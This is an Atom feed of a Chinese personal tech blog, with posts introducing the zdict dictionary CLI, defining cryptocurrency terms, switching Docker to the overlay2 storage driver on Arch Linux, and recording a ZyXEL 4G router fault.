<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Just for noting</title><link href="https://blog.m157q.tw/" rel="alternate"></link><link href="https://blog.m157q.tw/feeds/category.note.atom.xml" rel="self"></link><id>https://blog.m157q.tw/</id><updated>2018-02-01T00:38:24+08:00</updated><entry><title>zdict 介紹</title><link href="https://blog.m157q.tw/posts/2018/01/18/zdict-intro/" rel="alternate"></link><published>2018-02-01T00:38:24+08:00</published><updated>2018-02-01T00:38:24+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-18:posts/2018/01/18/zdict-intro/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/zdict/zdict"&gt;GitHub - zdict/zdict: The last online dictionary framework you need. (?)&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;在&lt;a href="https://blog.m157q.tw/posts/2018/01/09/tools-i-use/"&gt;我平常在電腦上用了哪些程式 | Just for noting&lt;/a&gt;這篇，有提到會為 &lt;code&gt;zdict&lt;/code&gt; 這套我和幾個朋友一起開發的線上字典查詢指令做個詳細一點的介紹，也算是幫 &lt;code&gt;zdict&lt;/code&gt; 加個繁體中文的文章吧。  &lt;/p&gt;
&lt;p&gt;因為 repo 上面都是用英文，幾個禮拜前遇到有台灣人想幫忙貢獻，對自己的英文不夠有自信，結果最後寄了 email 用中文問我，想說讓這個工具的文件多一點繁體中文的親切感（？  &lt;/p&gt;
&lt;p&gt;有空會再寫一篇文章講這位貢獻者來信詢問的問題以及我回覆的內容，主要是跟 GitHub 新手如何參與開源專案有關，想說第一次有人因為 &lt;code&gt;zdict&lt;/code&gt; 寄信給我，機會難得，順便用這個機會拿 &lt;code&gt;zdict&lt;/code&gt; 來當活教材。有徵得對方同意了，但文章一直還沒寫 XD。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;簡介&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/zdict/zdict"&gt;https://github.com/zdict/zdict&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;有以下幾個特性：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Python 3 撰寫  &lt;ul&gt;
&lt;li&gt;2020 年就要拋棄 Python 2 啦，因為是 side project，所以懶得支援 Python 2 了，請大家直接用 Python 3 吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;主要用途就是用來查線上字典  &lt;ul&gt;
&lt;li&gt;要連網才能使用  &lt;/li&gt;
&lt;li&gt;沒有離線模式  &lt;ul&gt;
&lt;li&gt;不使用字典檔  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;預設會使用資料庫中的快取（可選擇關閉）  &lt;ul&gt;
&lt;li&gt;每次的查詢預設都會先檢查有沒有存在使用者的電腦上的 zdict 資料庫，有的話就會直接拿來用。  &lt;/li&gt;
&lt;li&gt;所以如果是查詢自己查過的單字的話，是可以在不用連網的情況下使用的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;字典預設是使用 Yahoo! 奇摩字典的英翻中或中翻英查詢  &lt;ul&gt;
&lt;li&gt;有其他線上字典可供選擇：  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;moe&lt;/code&gt;: 萌典  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;moe-taiwanese&lt;/code&gt;: 萌典台語  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;spanish&lt;/code&gt;: 西班牙語  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;jisho&lt;/code&gt;: 日語  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;yahoo&lt;/code&gt;: 中英查詢  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;urban&lt;/code&gt;: Urban Dictionary，用來查英文流行用語，看美劇滿常用的。  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;yandex&lt;/code&gt;: 俄語  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;預設會有語法上色（可選擇關閉）  &lt;/li&gt;
&lt;li&gt;原生支援 macOS, Linux, FreeBSD。可透過 Docker 在 Windows 上執行。  &lt;/li&gt;
&lt;li&gt;有一般模式也有互動模式  &lt;ul&gt;
&lt;li&gt;互動模式很適合開啟來掛著，遇到有要查單字的時候就可以直接查，不需要再額外打 &lt;code&gt;zdict xxx&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;緣起&lt;/h2&gt;
&lt;p&gt;這個 side project 大概是從 2015 年 4 月開始的，一開始只是因為那陣子很常看美劇，所以有查單字的需求，覺得要開網頁動滑鼠很麻煩，所以就找有沒有可以在終端機裏面直接查字典的服務。  &lt;/p&gt;
&lt;p&gt;當時是找到 &lt;a href="https://github.com/chenpc/ydict"&gt;GitHub - chenpc/ydict&lt;/a&gt;，使用一陣子之後遇到 Yahoo! 字典網頁改版，所以有東西壞掉，發了個 PR 回去，結果作者很久沒處理，看起來在忙其他事了。  &lt;/p&gt;
&lt;p&gt;原本想說自己的 fork 改一改能用就好，但和 iblis 那天可能嗑了太多 Python，不知道發什麼神經覺得乾脆來弄一個可以整合查詢多個線上字典的框架好了。  &lt;/p&gt;
&lt;p&gt;因為 ydict 基本上就是個 Python 2 的 script 而已，當時就想說要弄一個 Pure Python 3 然後還要符合基本開源專案架構的 side project，所以 zdict 就這樣誕生了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;使用說明&lt;/h2&gt;
&lt;p&gt;這個就直接看 &lt;a href="https://github.com/zdict/zdict/blob/master/README.rst"&gt;zdict/README.rst&lt;/a&gt; 吧，裡頭的英文敘述沒有很難，就算看不懂其實也可以直接看截圖和 example 使用應該沒啥問題，我就不在這贅述了。這篇文章會比較像是開發心得的紀錄，留個念想（？）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;雜談&lt;/h2&gt;
&lt;p&gt;其實我還蠻享受這個和幾個朋友單純因為需求而開的 side project，從開始弄這個專案以來基本上沒啥壓力，然後想試一些跟 Python 有關的新東西都可以在這個 side project 嘗試，因為有了基本的開源專案的框架，要測一些東西也很方便，不需要自己再重頭刻一些有的沒的。  &lt;/p&gt;
&lt;p&gt;例如：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;透過 Travis CI 自動發佈新版本到 PyPI  &lt;/li&gt;
&lt;li&gt;透過 Docker Cloud 綁定 GitHub 的權限，在有新的 tag 的時候自動 build image，放到 Docker Hub，完成 Docker Image 的 CI。  &lt;ul&gt;
&lt;li&gt;這部份的功能原本是用 Docker Hub 做，但用到一半發現 Docker Hub 在這部份很難用，又剛好看到 Docker Cloud，試了一下發現做的比較好，所以就改用 Docker Cloud 了。  &lt;/li&gt;
&lt;li&gt;唯一一個被雷到的部份是，如果原先使用 Docker Hub，改用 Docker Cloud 的話，得把原本的 Docker Hub Repo 砍掉，用 Docker Cloud 來建一個新的 Automated build 的 Repo，這部份可能會多花一點時間。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;支援 Docker Image  &lt;/li&gt;
&lt;li&gt;pytest, coverage 相關的參數設定  &lt;/li&gt;
&lt;li&gt;使用 Pipfile  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上這些都是我初次經驗就拿這個專案來試，我覺得滿開心的。雖然快 3 年過去了，好像仍舊沒有成為當初說的框架，要新增新的字典進來我覺得也還不夠簡單，但就順其自然吧。  &lt;/p&gt;
&lt;p&gt;然後大家也是有啥需求就自己開 issue，然後自己開發。大多數都是「自己的 issue 自己解的狀況」：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有人因為想在 Vim 裏面用，所以直接寫了個 Vim plugin: &lt;a href="https://github.com/zdict/zdict.vim"&gt;GitHub - zdict/zdict.vim: A vim plugin integrate with zdict - the last online dictionary framework you need.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;有人因為懶得打指令想要補完，所以弄了個 completion script: &lt;a href="https://github.com/zdict/zdict.sh"&gt;GitHub - zdict/zdict.sh: A collection of shell completion scripts for zdict&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;有人因為想用滑鼠選起來就能直接查，所以寫了這個：&lt;a href="https://github.com/zdict/zdict.qt"&gt;GitHub - zdict/zdict.qt: zdict with Qt5 widget&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;反正就是很自由啦，連 organizaiton 都是拿 One Taiwan 的圖片產生器來改的：&lt;a href="https://github.com/zdict"&gt;zdict · GitHub&lt;/a&gt;，就知道有多北七。XD  &lt;/p&gt;
&lt;p&gt;我覺得大家應該都要至少要找到一個屬於自己的這種 side project，可以讓你跟一些人 cowork，但又不會有壓力，同時又符合你日常生活的需求。  &lt;/p&gt;
&lt;p&gt;而且因為彼此想要的功能不一樣，而且又是開放原始碼的專案，所以可以學到自己不會的東西。唯一的小缺憾大概就是，這只是個小確幸的專案，不是什麼大專案，但又何妨？  &lt;/p&gt;
&lt;p&gt;要練習寫程式的話真的從自身的需求出發就夠了，不需要做一個什麼多偉大多困難的專案，可以等夠熟練的時候再說，希望大家都能找到一個屬於自己的 side project 當作核爆場（誒  &lt;/p&gt;</summary><category term="zdict"></category><category term="online dictionary"></category><category term="cli"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>虛擬貨幣 vs 數位貨幣 vs 加密貨幣</title><link href="https://blog.m157q.tw/posts/2018/01/17/virtual-currency-vs-digital-currency-vs-cryptocurrency/" rel="alternate"></link><published>2018-01-17T05:30:34+08:00</published><updated>2018-01-17T05:30:34+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-17:posts/2018/01/17/virtual-currency-vs-digital-currency-vs-cryptocurrency/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;兩派說法  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;虛擬貨幣 == 數位貨幣 &amp;gt; 加密貨幣  &lt;/li&gt;
&lt;li&gt;虛擬貨幣 &amp;gt; 數位貨幣 &amp;gt; 加密貨幣  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;因為看到&lt;a href="https://twitter.com/tzangms/status/953252211957485571"&gt;推特上有人問&lt;/a&gt;，&lt;br /&gt;
自己其實也有被這問題困擾著，於是就花了點時間查了一下。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;紀錄&lt;/h2&gt;
&lt;p&gt;查了一些文章以後發現大致上分為兩派：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;「虛擬貨幣 == 數位貨幣 &amp;gt; 加密貨幣」派  &lt;ul&gt;
&lt;li&gt;目前以這派說法好像比較常見，英文維基百科上的描述偏向這類說法。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「虛擬貨幣 &amp;gt; 數位貨幣 &amp;gt; 加密貨幣」派  &lt;ul&gt;
&lt;li&gt;中文維基百科偏向這類說法。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;我自己歸納如下，我個人是比較傾向「虛擬貨幣 &amp;gt; 數位貨幣 &amp;gt; 加密貨幣」派  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;虛擬貨幣 == 非實體貨幣  &lt;/li&gt;
&lt;li&gt;數位貨幣 == 可用於購買現實物品的虛擬貨幣  &lt;/li&gt;
&lt;li&gt;加密貨幣 == 基於密碼學原理的數位貨幣  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E6%95%B8%E4%BD%8D%E8%B2%A8%E5%B9%A3"&gt;數位貨幣 - 維基百科，自由的百科全書&lt;/a&gt;有列出非加密貨幣的數位貨幣，例如: e-gold, Digital Monetary Trust, Ripple, Ven。  &lt;/p&gt;
&lt;p&gt;我自己覺得是有點像 Artifical Intelligence vs Machine Learning vs Deep Learning 的關係啦。&lt;br /&gt;
雖然一般人可能覺得能溝通就好，但我覺得身為一個處在這個專業領域的人士，應該要有自己的堅持。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.quora.com/What-is-the-difference-between-a-cryptocurrency-a-digital-currency-and-a-virtual-currency"&gt;What is the difference between a cryptocurrency, a digital currency, and a virtual currency?&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Virtual_currency"&gt;Virtual currency - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Digital_currency"&gt;Digital currency - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Cryptocurrency"&gt;Cryptocurrency - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E8%99%9A%E6%8B%9F%E8%B4%A7%E5%B8%81"&gt;虛擬貨幣 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E6%95%B8%E4%BD%8D%E8%B2%A8%E5%B9%A3"&gt;數位貨幣 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/zh-tw/%E5%AF%86%E7%A2%BC%E8%B2%A8%E5%B9%A3"&gt;密碼貨幣 - 維基百科，自由的百科全書&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="virtual currency"></category><category term="digital currency"></category><category term="cryptocurrency"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>在 Arch Linux 上將 Docker 的 Storage Driver 從 devicemapper 改為 overlay2 以釋放硬碟空間</title><link href="https://blog.m157q.tw/posts/2018/01/16/change-docker-storage-driver-from-devicemapper-to-overlay2-to-free-your-disk-space-on-arch-linux/" rel="alternate"></link><published>2018-01-17T05:05:02+08:00</published><updated>2018-01-17T05:05:02+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-16:posts/2018/01/16/change-docker-storage-driver-from-devicemapper-to-overlay2-to-free-your-disk-space-on-arch-linux/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://wiki.archlinux.org/index.php/Docker#Storage_driver"&gt;https://wiki.archlinux.org/index.php/Docker#Storage_driver&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;因為硬碟空間只剩 1.8 GB，在清硬碟空間的時候發現 &lt;code&gt;/var/lib/docker/devicemapper&lt;/code&gt; 佔了 35 GB，以前同事在 Mac 上遇過，但一直找不到啥好解法，這次自己遇到了，於是就花了點時間查了一下。  &lt;/p&gt;
&lt;p&gt;先是用了 &lt;code&gt;docker system prune -a&lt;/code&gt; 把所有東西都清掉，結果發現 &lt;code&gt;/var/lib/docker/devicemappe&lt;/code&gt; 的大小只有減少 1 GB，但明明用 &lt;code&gt;docker info&lt;/code&gt; 檢查， Data used 就只剩 KB 而已，於是跑去找 Arch Wiki。  &lt;/p&gt;
&lt;p&gt;得到 Storage Driver 最好不要用 &lt;code&gt;devicemapper&lt;/code&gt; 的答案，新安裝的預設應該都會是 &lt;code&gt;overlay2&lt;/code&gt; 了，發現自己的 docker 仍舊是使用 &lt;code&gt;devicemapper&lt;/code&gt;，所以乾脆動手修改一下。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;步驟&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;systemctl stop docker&lt;/code&gt; 把 dockerd 關了  &lt;/li&gt;
&lt;li&gt;因為我已經用 &lt;code&gt;docker system prune -a&lt;/code&gt; 把東西全砍了，所以就沒備份必要，直接 &lt;code&gt;sudo rm -rf /var/lib/docker&lt;/code&gt; 了  &lt;ul&gt;
&lt;li&gt;這個時候硬碟就多出了 35 GB 啦！  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;systemctl edit docker&lt;/code&gt; 編輯設定檔  &lt;ul&gt;
&lt;li&gt;如果 root 使用的 editor 非平常慣用的話，可以先 &lt;code&gt;export EDITOR=vim&lt;/code&gt; 再使用 &lt;code&gt;sudo -E bash -c "systemctl edit docker"&lt;/code&gt; 來編輯  &lt;/li&gt;
&lt;li&gt;應該會開啟 &lt;code&gt;/etc/systemd/system/docker.service.d/override.conf&lt;/code&gt; 或其暫存檔  &lt;/li&gt;
&lt;li&gt;新增以下內容，將 Storage Driver 指定成 &lt;code&gt;overlay2&lt;/code&gt; 後存檔離開：  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[Service]  
ExecStart=  
ExecStart=/usr/bin/dockerd -H fd:// -s overlay2  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;systemctl start docker&lt;/code&gt; 重新開啟 dockerd  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;docker info | head&lt;/code&gt; 裡頭應該要有一行 "Storage Driver: overlay2" 這樣就成功了  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;補充&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.docker.com/engine/userguide/storagedriver/selectadriver/"&gt;Select a storage driver | Docker Documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇官方文件講述有哪些 Storage Driver 可供選擇以及各 Storage Driver 支援的 File System 格式  &lt;/li&gt;
&lt;li&gt;包含：&lt;code&gt;aufs&lt;/code&gt;, &lt;code&gt;devicemapper&lt;/code&gt;, &lt;code&gt;overlay&lt;/code&gt;, &lt;code&gt;overlay2&lt;/code&gt;, &lt;code&gt;btrfs&lt;/code&gt;, &lt;code&gt;zfs&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;我自己是沒有詳細研究所有 Storage Driver 的優劣就是  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.docker.com/engine/userguide/storagedriver/overlayfs-driver/"&gt;Use the OverlayFS storage driver | Docker Documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇官方文件則講述怎麼把 Storage Driver 設定成 &lt;code&gt;overlay&lt;/code&gt; 和 &lt;code&gt;overlay2&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;建議是能用 &lt;code&gt;overlay2&lt;/code&gt; 就別用 &lt;code&gt;overlay&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;也講了 &lt;code&gt;overlay&lt;/code&gt; 和 &lt;code&gt;overlay2&lt;/code&gt; 的運作原理，還有效能和限制方面的部份  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Docker#Storage_driver"&gt;Docker - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.docker.com/engine/userguide/storagedriver/overlayfs-driver/"&gt;Use the OverlayFS storage driver | Docker Documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.docker.com/engine/userguide/storagedriver/selectadriver/"&gt;Select a storage driver | Docker Documentation&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Docker"></category><category term="devicemapper"></category><category term="overlayFS"></category><category term="Arch Linux"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>ZyXEL WAH7706 問題紀錄</title><link href="https://blog.m157q.tw/posts/2018/01/13/zyxel-wah7706/" rel="alternate"></link><published>2018-01-13T21:52:00+08:00</published><updated>2018-01-13T21:52:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-13:posts/2018/01/13/zyxel-wah7706/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;在這篇 &lt;a href="/posts/2017/12/20/4g-mobile-network-tw/"&gt;關於 4G 行動網路的一些筆記 | Just for noting&lt;/a&gt; 有提到我買了一個攜帶型 4G 網路分享器，我買的就是 ZyXEL 的 WAH7706。  &lt;/p&gt;
&lt;p&gt;其實當時是在 NetGear AirCard 790S, ZyXEL WAH7706, D-Link DWR-933 這三台都有 2CA 的在比較：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;雖然 AirCard 790S 便宜很多，也支援 2CA，但因為當時急著用，如果要用露天買的話要等上幾天，再加上 NetGear 在台灣的代理商沒有代理這個產品，所以都是有人改水貨來賣，然後簡訊又不一定有中文支援，所以就沒考慮，畢竟有時候還是得靠簡訊來知道電信商那邊的通知訊息。  &lt;/li&gt;
&lt;li&gt;D-Link DWR-933 和 WAH7706 我在 PChome 上看的價錢都是 4000 左右。  &lt;ul&gt;
&lt;li&gt;DWR-933 號稱續航 12 小時，比 WAH7706 號稱續航 10 小時多了 2 小時  &lt;/li&gt;
&lt;li&gt;在頻段支援的部份比 WAH7706 少了 Band 38 和  Band 40  的部份  &lt;/li&gt;
&lt;li&gt;能支援最多 16 個裝置連線，WAH7706 則是 32 個。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以最後選了 ZyXEL WAH7706。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;摘要&lt;/h2&gt;
&lt;p&gt;使用後遇到了一些問題，查了一下竟然是用台灣大哥大的 SIM 卡才會遇到，打電話去合勤詢問後，客服要我寄封電子郵件描述狀況，工程師魂發作了一下，所以寄了一封描述算詳盡的的電子郵件過去，：  &lt;/p&gt;
&lt;p&gt;&lt;img alt="report-1" src="/files/zyxel-wah7706/report-1.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;&lt;img alt="report-2" src="/files/zyxel-wah7706/report-2.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;最後就是換貨處理。  &lt;/p&gt;
&lt;p&gt;想說就用這篇文章紀錄下來，給自己留個紀錄，也給之後有遇到這個問題的人可以在網路上查到，因為我自己查的時候只有找到幾個人有提到這問題。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;完整紀錄&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;這邊先附上您要的「電信業者 SIM 卡接入 WAH7706 無法收到訊號的網頁介面及 OLED 介面圖示」&lt;br /&gt;
網頁介面圖示【附 1】、OLED 介面圖示【附 2】&lt;br /&gt;
&lt;img alt="attach-1" src="/files/zyxel-wah7706/attach-1.jpg" /&gt;&lt;br /&gt;
&lt;img alt="attach-2" src="/files/zyxel-wah7706/attach-2.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;另外補充一下，我在電話中講錯了，我掛完電話後再次確認才發現，我出問題的韌體版本是 V1.00 (ABBC.6) C0。但不影響本次的回報，因為我後來有把韌體升級到最新的 V1.00 (ABBC.8) C0，依然沒有解決這問題【附 3】。&lt;br /&gt;
&lt;img alt="attach-3" src="/files/zyxel-wah7706/attach-3.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;以下我試著完整描述使用情況，以儘可能協助釐清產品問題。  &lt;/p&gt;
&lt;p&gt;我在 2017/12/14 於 PCHome 網購貴公司的 WAH7706【附 4】，並於 2017/12/15 開始搭配台灣大哥大的 4G SIM 卡使用，購買之前就有確認 WAH7706 支援台灣大哥大的 4G 頻段 B3, B28，使用狀況一切良好。&lt;br /&gt;
&lt;img alt="attach-4" src="/files/zyxel-wah7706/attach-4.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;直到 2017/12/18 晚上，發現 WAH7706 接收不到台灣大哥大的訊號，OLED 介面顯示 No Service【附 2】。截至此時，總使用流量約為 41 GB。無論 Reboot 或是 Reset WAH7706 都無法解決此問題。&lt;br /&gt;
&lt;img alt="attach-2" src="/files/zyxel-wah7706/attach-2.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;為了確認台灣大哥大的 4G SIM 卡是沒有被鎖卡的，我把台灣大哥大的 4G SIM 卡裝入 iPhone SE，確認是可以收到 4G 訊號且可以正常上網的。（今天透過電話回報完後也有再次確認，請見【附 5】)&lt;br /&gt;
&lt;img alt="attach-5" src="/files/zyxel-wah7706/attach-5.png" /&gt;  &lt;/p&gt;
&lt;p&gt;之後又為了確認 WAH7706 仍然可以正常收發 4G 訊號並連接網路，我把中華電信的 4G SIM 卡裝入 WAH7706，也確實可以正常運作。（今天透過電話回報完後也有再次確認，請見【附 6】)&lt;br /&gt;
&lt;img alt="attach-6" src="/files/zyxel-wah7706/attach-6.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;其後我又將台灣大哥大的 4G SIM 卡裝回 WAH7706 ，透過網頁後台做了一些嘗試，但都無效（截圖都是今天早上電話回報完後使用新版韌體的結果）。  &lt;/p&gt;
&lt;p&gt;一、把「蜂巢式網路模式」調成「自動」，有兩種狀況：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;依然接受不到 4G 訊號且大多數時間不會自動向下相容使用 3G 訊號。【附 7】&lt;br /&gt;
&lt;img alt="attach-7" src="/files/zyxel-wah7706/attach-7.jpg" /&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;少數時間會自動改成使用 3G 網路，雖然顯示是接收得到 3G 訊號的，但卻無法連線至網路。(左上角第 3 個連接網路圖示是斷開的。）【附 8】&lt;br /&gt;
&lt;img alt="attach-8" src="/files/zyxel-wah7706/attach-8.jpg" /&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;二、將「蜂巢式網路模式」調成「3G  模式」，則有較高機會連上網路【附 9】，但有時候還是會有接收得到 3G 訊號卻無法連線的狀況。【附 10】&lt;br /&gt;
&lt;img alt="attach-9" src="/files/zyxel-wah7706/attach-9.jpg" /&gt;&lt;br /&gt;
&lt;img alt="attach-10" src="/files/zyxel-wah7706/attach-10.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;便於今天早上透過電話回報此問題，其後我也有打電話向台灣大哥大確認我使用的 4G SIM 卡是沒有被鎖卡的。且有進一步詢問是否可能同一張 SIM 卡但針對不同裝置進行限制，得到的答案是「沒有，沒有這樣的機制，只會直接鎖卡。」  &lt;/p&gt;
&lt;p&gt;另外在網路上也有找到其他使用貴公司 WAH7706 搭配台灣大哥大 4G SIM 卡的使用者遇到一樣的問題，附上連結供參考。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/MobileComm/M.1469287236.A.E7C.html"&gt;[問題] WAH7706 使用上的疑問&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/MobileComm/M.1476361987.A.072.html"&gt;Re: [問題] WAH7706 使用上的疑問&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.dcard.tw/f/3c/p/225104974"&gt;#求救 #ZYXEL WAH7706 陣亡&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;再麻煩貴公司相關人員協助處理了，感謝。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;結果&lt;/h2&gt;
&lt;p&gt;在 2017/12/28 下午到 ZyXEL 代理商展碁國際在台北的據點換貨之後，一回去馬上先把韌體升級到最新版才開始使用，目前使用到今天大概兩個多禮拜都還正常，如果之後又遇到問題的話會再更新在這篇文章，畢竟有遇到有人是用了超過一個月才出問題的。  &lt;/p&gt;</summary><category term="ZyXEL"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>整理一些跟面試相關的文章</title><link href="https://blog.m157q.tw/posts/2018/01/12/articles-related-to-interview/" rel="alternate"></link><published>2018-01-12T22:50:58+08:00</published><updated>2018-01-12T22:50:58+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-12:posts/2018/01/12/articles-related-to-interview/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;2015 年底開始找正職工作的時候，就覺得自己對面試這件事實在不拿手，也沒有什麼信心。畢竟學校也沒教，然後自己之前在學校裏面做些跟寫程式相關的工作也都不算有太嚴格的面試，大多都是認識的人問我有沒有興趣就做了。  &lt;/p&gt;
&lt;p&gt;當時唯二兩個有面試的工作裡頭，其中一個是要處理網路設備相關的工作，問了我 C/C++ 的問題，我當時啥都沒準備，答得超爛，就不了了之。另外一個則是系上計算機中心的助教，但這嚴格說起來不算是很難的面試，因為考試內容基本上就是上學期學的計算機系統管理，以及下學期學的計算機網路管理。我在這兩門課都拿到不錯的分數，沒記錯的話應該是 97 和 99 吧 ，因為學得很有興趣，就被問問有沒有興趣當助教。所以考試的題目基本上都是學過的東西，面試官也都是修課時看了一年的助教，沒有什麼太強烈的緊張感。  &lt;/p&gt;
